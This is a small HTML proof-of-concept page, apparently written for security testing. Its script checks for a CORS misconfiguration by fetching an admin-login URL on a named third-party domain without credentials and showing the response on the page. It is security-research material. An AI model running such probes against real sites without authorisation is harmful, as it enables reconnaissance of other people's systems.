<!doctype html>
<html>
<body>
  <h3>CORS PoC — Read (no credentials)</h3>
  <pre id="out">Running...</pre>
  <script>
    fetch("https://go.capital.com/v2/login/admin-login/", {
      method: "GET",
      // **مهم**: لا تستخدم credentials here
      credentials: "omit"
    })
    .then(r => r.text())
    .then(t => document.getElementById('out').textContent = t.slice(0,2000))
    .catch(e => document.getElementById('out').textContent = 'Failed: ' + e);
  </script>
</body>
</html>
